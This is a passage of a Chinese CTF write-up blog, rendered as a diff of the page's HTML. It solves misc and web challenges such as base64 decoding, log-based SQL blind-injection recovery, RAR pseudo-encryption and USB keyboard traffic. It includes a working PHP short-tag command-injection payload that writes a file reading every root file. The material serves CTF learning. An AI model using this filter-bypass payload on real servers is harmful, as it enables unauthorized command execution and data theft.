 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61<br></code></pre></td></tr></table></figure>
 <p>使用脚本进行处理</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">90</span>,<span class="hljs-number">109</span>,<span class="hljs-number">120</span>,<span class="hljs-number">104</span>,<span class="hljs-number">90</span>,<span class="hljs-number">51</span>,<span class="hljs-number">116</span>,<span class="hljs-number">90</span>,<span class="hljs-number">98</span>,<span class="hljs-number">51</span>,<span class="hljs-number">86</span>,<span class="hljs-number">102</span>,<span class="hljs-number">89</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">108</span>,<span class="hljs-number">88</span>,<span class="hljs-number">51</span>,<span class="hljs-number">78</span>,<span class="hljs-number">118</span>,<span class="hljs-number">88</span>,<span class="hljs-number">50</span>,<span class="hljs-number">100</span>,<span class="hljs-number">121</span>,<span class="hljs-number">90</span>,<span class="hljs-number">87</span>,<span class="hljs-number">70</span>,<span class="hljs-number">48</span>,<span class="hljs-number">102</span>,<span class="hljs-number">81</span>,<span class="hljs-number">61</span>,<span class="hljs-number">61</span>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    flag=flag+<span class="hljs-built_in">chr</span>(i)<br>    <br>print(flag)<br>print(base64.b64decode(flag))<br></code></pre></td></tr></table></figure>
@@ -94,7 +260,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><lin
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==<br>b<span class="hljs-string">&#x27;flag&#123;You_are_so_great&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
 <p>一个一个找长度为377的包太麻烦了，附上大师傅的脚本：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">from base64 import *<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>with open(<span class="hljs-string">&#x27;access.log&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;select%20flag%20from%20flllag&quot;</span> <span class="hljs-keyword">in</span> line:<br>            packet_len = line[line.find(<span class="hljs-string">&#x27; 200 &#x27;</span>)+5:line.find(<span class="hljs-string">&#x27; &quot;-&quot; &quot;python-requests/2.21.0&quot;&#x27;</span>)]<br>            <span class="hljs-keyword">if</span> packet_len == <span class="hljs-string">&#x27;377&#x27;</span>:<br>                ascii_code = line[line.find(<span class="hljs-string">&#x27;))=&#x27;</span>)+3:line.find(<span class="hljs-string">&#x27;,sleep&#x27;</span>)]<br>                ascii_str = chr(int(ascii_code))<br>                flag += ascii_str<br>            <span class="hljs-keyword">else</span>:<br>                pass<br>        <span class="hljs-keyword">else</span>:<br>            pass<br><br><span class="hljs-built_in">print</span>(b64decode(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure>
-<h1 id="红明谷CTF"><a href="#红明谷CTF" class="headerlink" title="红明谷CTF"></a>红明谷CTF</h1><h2 id="Web-write-shell"><a href="#Web-write-shell" class="headerlink" title="Web-write_shell"></a>Web-write_shell</h2><p>没报上名，在BUU上面找到的环境<br><img src="https://img-blog.csdnimg.cn/20210405165110827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="红明谷CTF"><a href="#红明谷CTF" class="headerlink" title="红明谷CTF"></a>红明谷CTF</h1><h2 id="Web-write-shell"><a href="#Web-write-shell" class="headerlink" title="Web-write_shell"></a>Web-write_shell</h2><p>没报上名，在BUU上面找到的环境<br><img src="https://img-blog.csdnimg.cn/20210405165110827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p><strong>知识点：短标签绕过php过滤</strong></p>
 <blockquote>
 <p>PHP开启短标签即short_open_tag=on时，可以使用<?=$_?>输出变量</p>
@@ -104,21 +270,21 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><lin
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、写入文件，但是对<span class="hljs-variable">$data</span>变量进行了过滤<br>2、使用&lt;?=?&gt; 短标签即可绕过php然后输出<br>3、用反引号直接执行命令<br>4、过滤了空格,用%09代替空格<br></code></pre></td></tr></table></figure>
 <p>根据源码，先查看当前目录</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=<span class="hljs-built_in">pwd</span> <br><span class="hljs-comment">#sandbox/d99081fe929b750e0557f85e6499103f/</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210404173216510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试读取根目录下的所有文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210404173216510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>尝试读取根目录下的所有文件</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=upload&amp;data=&lt;?=`cat%09/*`?&gt;<br></code></pre></td></tr></table></figure>
-<p>最后访问<code>/sandbox/d99081fe929b750e0557f85e6499103f/</code>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404173408667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>最后访问<code>/sandbox/d99081fe929b750e0557f85e6499103f/</code>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404173408667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <h2 id="MISC-我的心是冰冰的"><a href="#MISC-我的心是冰冰的" class="headerlink" title="MISC-我的心是冰冰的"></a>MISC-我的心是冰冰的</h2><p>题目描述：似乎有信息被隐藏了。</p>
-<p>打开rar压缩包文件受损，可能存在RAR伪加密，按照<a target="_blank" rel="noopener" href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1near师傅的博客</a>，将24字节处的84改为80即可<br><img src="https://img-blog.csdnimg.cn/20210404180245275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压压缩包得到<br><img src="https://img-blog.csdnimg.cn/20210404180359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看wp发现是java盲水印</p>
+<p>打开rar压缩包文件受损，可能存在RAR伪加密，按照<a target="_blank" rel="noopener" href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1near师傅的博客</a>，将24字节处的84改为80即可<br><img src="https://img-blog.csdnimg.cn/20210404180245275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>解压压缩包得到<br><img src="https://img-blog.csdnimg.cn/20210404180359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>看wp发现是java盲水印</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210408214553555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>得到口令<code>gnibgnib</code>，解压得到bingbing.pcapng流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210408214553555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>得到口令<code>gnibgnib</code>，解压得到bingbing.pcapng流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>tshark提取USB流量</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行</p>
+<p><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>剔除空行</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用脚本加上冒号</p>
+<p><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>利用脚本加上冒号</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量的话len改为16</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <p>通用脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure>
 <p>运行脚本得到：</p>
@@ -129,297 +295,297 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"><lin
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure>
 <p>得到</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
-<h1 id="ctfshow渔人杯"><a href="#ctfshow渔人杯" class="headerlink" title="ctfshow渔人杯"></a>ctfshow渔人杯</h1><h2 id="签到抽奖"><a href="#签到抽奖" class="headerlink" title="签到抽奖"></a>签到抽奖</h2><p><img src="https://img-blog.csdnimg.cn/20210404122728247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag为</p>
+<h1 id="ctfshow渔人杯"><a href="#ctfshow渔人杯" class="headerlink" title="ctfshow渔人杯"></a>ctfshow渔人杯</h1><h2 id="签到抽奖"><a href="#签到抽奖" class="headerlink" title="签到抽奖"></a>签到抽奖</h2><p><img src="https://img-blog.csdnimg.cn/20210404122728247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>flag为</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">中文也可能是英文及其他小众语言字符<br></code></pre></td></tr></table></figure>
 <h2 id="感受下气氛"><a href="#感受下气氛" class="headerlink" title="感受下气氛"></a>感受下气氛</h2><p>flag是ctfshow{[0-9]{9}}</p>
 <p>正则匹配，符合条件的都可以，比如：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;123456789&#125;<br></code></pre></td></tr></table></figure>
-<h2 id="神仙姐姐"><a href="#神仙姐姐" class="headerlink" title="神仙姐姐"></a>神仙姐姐</h2><p><img src="https://img-blog.csdnimg.cn/20210404123026959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击拜，抓包<br><img src="https://img-blog.csdnimg.cn/20210404123102170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传参num进行爆破，根据提示num在1-1000内<br><img src="https://img-blog.csdnimg.cn/20210404125742649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>都是假flag，一直往下翻<br><img src="https://img-blog.csdnimg.cn/20210404124738984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>编写脚本进行爆破</p>
+<h2 id="神仙姐姐"><a href="#神仙姐姐" class="headerlink" title="神仙姐姐"></a>神仙姐姐</h2><p><img src="https://img-blog.csdnimg.cn/20210404123026959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>点击拜，抓包<br><img src="https://img-blog.csdnimg.cn/20210404123102170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>传参num进行爆破，根据提示num在1-1000内<br><img src="https://img-blog.csdnimg.cn/20210404125742649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>都是假flag，一直往下翻<br><img src="https://img-blog.csdnimg.cn/20210404124738984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>编写脚本进行爆破</p>
